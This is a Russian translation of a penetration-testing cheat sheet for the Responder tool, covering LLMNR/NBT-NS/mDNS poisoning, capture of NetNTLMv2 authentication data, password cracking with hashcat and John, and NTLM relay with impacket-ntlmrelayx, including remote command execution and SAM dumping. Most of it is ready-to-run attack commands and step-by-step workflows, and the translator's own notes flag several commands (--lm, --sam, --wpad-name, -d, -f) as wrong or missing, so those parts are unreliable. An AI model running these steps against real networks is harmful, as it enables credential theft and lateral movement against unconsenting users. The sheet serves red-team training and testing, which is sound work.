<a id="-responder---llmnrnbt-ns-poisoning"></a>
# 🎣 Responder — подмена ответов LLMNR/NBT-NS

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md) • [🏠 Русская главная](../../README.ru.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               LLMNR/NBT-NS/mDNS Poisoner
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое Responder](#-what-is-responder)
- [Установка](#-installation)
- [Основы использования](#-basic-usage)
- [Захват данных NTLMv2](#-capture-ntlmv2-hashes)
- [Атаки с ретрансляцией аутентификации](#-relay-attacks)
- [Поддельные серверы](#-rogue-servers)
- [Настройка](#-configuration)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-responder"></a>
## 🎯 Что такое Responder

> **Термины:** здесь под «хешами NTLM» обычно понимаются данные challenge-response **NetNTLMv1/v2**, а не NT-хеш пароля. Клиент не передаёт свой NT-хеш напрямую. Это различие важно для интерпретации результатов и режимов подбора. См. [описание Responder](https://github.com/lgandx/Responder#overview) и [примеры Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes).

**Responder** подменяет ответы LLMNR, NBT-NS и mDNS, чтобы получать данные аутентификации NTLM:

- 🎣 **Подмена LLMNR** — разрешение имён через многоадресные запросы в локальной сети (Link-Local Multicast Name Resolution)
- 📡 **Подмена NBT-NS** — служба имён NetBIOS (NetBIOS Name Service)
- 🍎 **Подмена mDNS** — многоадресный DNS (Multicast DNS)
- 🔓 **Захват хешей** — данные NTLMv1/NTLMv2
- 🔄 **Поддержка relay** — ретрансляция аутентификации NTLM

<a id="how-it-works"></a>
### Как это работает

```
1. Пользователь ошибается в имени узла: \\fileservr (опечатка)
2. DNS не разрешает имя
3. Windows отправляет запрос LLMNR/NBT-NS
4. Responder отвечает: "I'm fileservr!"
5. Целевой клиент передаёт NTLM-ответ для аутентификации
6. Данные перехвачены для подбора пароля или relay
```

---

<a id="-installation"></a>
## 🚀 Установка

<a id="kali-linux"></a>
### Kali Linux

> **Версии:** предустановка зависит от образа Kali. В актуальном исходном Responder указан Python 3; команда с `python` сохранена из оригинала и зависит от того, какой интерпретатор выбран в среде. См. [Responder.py](https://github.com/lgandx/Responder/blob/master/Responder.py).

```bash
# Предустановлен
responder --help

# Обновление
sudo apt update && sudo apt install responder

# Или из GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

<a id="verify"></a>
### Проверка

```bash
responder --help
responder -I eth0 --version
```

---

<a id="-basic-usage"></a>
## 💻 Основы использования

<a id="start-responder"></a>
### Запуск Responder

```bash
# Базовый запуск (захват хешей)
sudo responder -I eth0

# Подробный вывод
sudo responder -I eth0 -v

# Режим анализа (пассивный)
sudo responder -I eth0 -A
```

<a id="interface-selection"></a>
### Выбор интерфейса

```bash
# Ethernet
sudo responder -I eth0

# Беспроводной интерфейс
sudo responder -I wlan0

# Список интерфейсов
ip a
```

---

<a id="-capture-ntlmv2-hashes"></a>
## 🔓 Захват данных NTLMv2

<a id="basic-capture"></a>
### Базовый захват

```bash
# Запустить Responder
sudo responder -I eth0

# Ожидание подключений целевых клиентов...
# Пример вывода:
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

<a id="force-ntlmv2"></a>
### Принудительное использование NTLMv2

> **Исправление оригинала:** `--lm` запрашивает понижение до LM для старых клиентов, а не принудительный NTLMv2. Команда оставлена без изменений. См. [официальный парсер](https://github.com/lgandx/Responder/blob/master/Responder.py).

```bash
# Только NTLMv2 (рекомендуется для подбора паролей)
sudo responder -I eth0 --lm
```

<a id="wpad-capture"></a>
### Захват через WPAD

```bash
# Включить прокси WPAD
sudo responder -I eth0 -w

# Запросить аутентификацию WPAD
sudo responder -I eth0 -wF
```

<a id="hash-locations"></a>
### Расположение файлов с хешами

> **Расположение:** пути и имена ниже — примеры оригинала. Каталог журналов определяется установкой и конфигурацией; разные типы данных следует различать. См. [настройки Responder](https://github.com/lgandx/Responder/blob/master/Responder.conf).

```bash
# Захваченные данные сохраняются в:
/usr/share/responder/logs/
# Или
./logs/

# Файлы:
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

<a id="crack-captured-hashes"></a>
### Подбор паролей по захваченным данным

```bash
# Формат NTLMv2:
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (режим 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

<a id="-relay-attacks"></a>
## 🔄 Атаки с ретрансляцией аутентификации

> **Уточнение relay:** ntlmrelayx перенаправляет текущий обмен аутентификации; файл с ранее захваченным NetNTLM-ответом не является готовым материалом для последующего relay. Успех зависит от протокола, прав и защит сервиса, а не только от отсутствия подписи SMB. См. [реализацию ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).

<a id="disable-smbhttp-for-relay"></a>
### Отключение SMB/HTTP (для relay)

```bash
# Изменить Responder.conf
sudo nano /usr/share/responder/Responder.conf

# Задать:
SMB = Off
HTTP = Off
```

<a id="responder--ntlmrelayx"></a>
### Responder + ntlmrelayx

```bash
# Терминал 1: Responder (без SMB/HTTP)
sudo responder -I eth0

# Терминал 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Или с выполнением команды
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

<a id="relay-to-ldap"></a>
### Ретрансляция в LDAP

```bash
# Responder
sudo responder -I eth0

# Ретрансляция в LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

<a id="relay-for-sam-dump"></a>
### Ретрансляция для извлечения SAM

> **Совместимость:** `--sam` отсутствует в текущем парсере ntlmrelayx. Для SMB извлечение SAM описано как стандартное действие без заданной команды, но требует соответствующих прав. Пример оригинала сохранён. См. [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py).

```bash
# Извлечь SAM при ретрансляции
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

<a id="-rogue-servers"></a>
## 🖥️ Поддельные серверы

<a id="built-in-servers"></a>
### Встроенные серверы

| Сервер | Порт | Назначение |
|--------|------|---------|
| SMB | 445 | Аутентификация к общему файловому ресурсу |
| HTTP | 80 | Веб-аутентификация |
| HTTPS | 443 | Веб-соединение с TLS |
| FTP | 21 | Аутентификация FTP |
| SQL | 1433 | Аутентификация MSSQL |
| LDAP | 389 | Аутентификация службы каталогов |
| WPAD | 80 | Настройки прокси |

<a id="enabledisable-servers"></a>
### Включение и отключение серверов

```bash
# Изменить Responder.conf
[Responder Core]
; Серверы для запуска
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

<a id="wpad-rogue-proxy"></a>
### Поддельный прокси WPAD

> **Уточнение WPAD:** `-F` требует аутентификацию при получении wpad.dat и сам по себе не означает исключительно Basic. `--wpad-name` в текущем парсере отсутствует; для собственного содержимого конфигурация предусматривает WPADScript. См. [парсер](https://github.com/lgandx/Responder/blob/master/Responder.py) и [конфигурацию](https://github.com/lgandx/Responder/blob/master/Responder.conf).

```bash
# Включить WPAD
sudo responder -I eth0 -w

# Запросить аутентификацию Basic для WPAD
sudo responder -I eth0 -wF

# Собственный сценарий WPAD
sudo responder -I eth0 -w --wpad-name wpad.dat
```

<a id="dns-spoofing"></a>
### Подмена DNS

> **Исправление оригинала:** `-d` включает DHCPv4 poisoning, а не DNS-сервер. DNS управляется настройками сервера. См. [официальный парсер](https://github.com/lgandx/Responder/blob/master/Responder.py).

```bash
# Включить DNS
sudo responder -I eth0 -d

# Responder становится DNS-сервером
# Отвечает на запросы для всех узлов
```

---

<a id="-configuration"></a>
## ⚙️ Настройка

<a id="responderconf"></a>
### Responder.conf

```bash
# Расположение
/usr/share/responder/Responder.conf
# Или
./Responder.conf
```

<a id="key-settings"></a>
### Основные настройки

> **Уточнение фильтра:** DontRespondTo исключает указанные IP-адреса; пустое значение не означает автоматическое исключение всех локальных запросов. См. [Responder.conf](https://github.com/lgandx/Responder/blob/master/Responder.conf).

```ini
[Responder Core]
; Задать On или Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Собственный challenge (для радужных таблиц)
Challenge = Random

; Не отвечать на локальные запросы
DontRespondTo =

; Отвечать только этим IP-адресам
RespondTo =
```

<a id="static-challenge-rainbow-tables"></a>
### Фиксированный challenge (радужные таблицы)

> **Ограничение:** фиксированный challenge сам по себе не создаёт универсальные радужные таблицы для NetNTLMv2: результат зависит и от остальных полей обмена. Формат содержит challenge и данные ответа. См. [официальные форматы Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes).

```ini
; Задать фиксированный challenge для предварительно вычисленных таблиц
Challenge = 1122334455667788
```

<a id="exclusions"></a>
### Исключения

```ini
; Не отвечать этим IP-адресам
DontRespondTo = 192.168.1.1, 192.168.1.2

; Отвечать только этим адресам
RespondTo = 192.168.1.100, 192.168.1.101
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="essential-commands"></a>
### Основные команды

| Команда | Описание |
|---------|-------------|
| `responder -I eth0` | Базовый захват |
| `responder -I eth0 -v` | Подробный вывод |
| `responder -I eth0 -A` | Только анализ |
| `responder -I eth0 -w` | Включить WPAD |
| `responder -I eth0 -wF` | Запросить аутентификацию WPAD |
| `responder -I eth0 -d` | Включить DNS |

<a id="flags"></a>
### Параметры

> **Версии:** `-f` не указан в текущем парсере Responder. Таблица отражает оригинал; доступность флагов зависит от версии. См. [Responder.py](https://github.com/lgandx/Responder/blob/master/Responder.py).

| Параметр | Описание |
|------|-------------|
| `-I` | Интерфейс |
| `-v` | Подробный вывод |
| `-A` | Режим анализа (пассивный) |
| `-w` | Включить WPAD |
| `-wF` | Запросить аутентификацию WPAD |
| `-d` | Включить DNS |
| `-f` | Определение характеристик узлов |
| `-b` | Использовать аутентификацию Basic |

<a id="hash-types"></a>
### Типы хешей

| Тип | Режим Hashcat | Формат John |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

<a id="attack-workflow"></a>
### Последовательность атаки

```bash
# 1. Запустить Responder
sudo responder -I eth0 -wFv

# 2. Дождаться данных аутентификации
# Данные сохраняются в ./logs/

# 3. Подобрать пароли
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. Или relay (сначала отключить SMB)
sudo responder -I eth0  # SMB=Off в конфигурации
impacket-ntlmrelayx -tf targets.txt -smb2support
```

<a id="relay-workflow"></a>
### Последовательность relay

```bash
# 1. Найти узлы без обязательной подписи SMB
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Настроить Responder.conf
# SMB = Off
# HTTP = Off

# 3. Запустить Responder
sudo responder -I eth0

# 4. Запустить relay
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. Дождаться ретранслируемой аутентификации
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Responder на GitHub](https://github.com/lgandx/Responder)
- [Подмена LLMNR](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [Impacket](../../Impacket/translations/README.ru.md)
- [CrackMapExec](../../CrackMapExec/translations/README.ru.md)
- [Hashcat](../../Hashcat/translations/README.ru.md)

---

<p align="center">
  <b>🎣 Осваивайте захват данных аутентификации!</b><br>
  <i>Responder — инструмент сбора сетевых учётных данных</i>
</p>
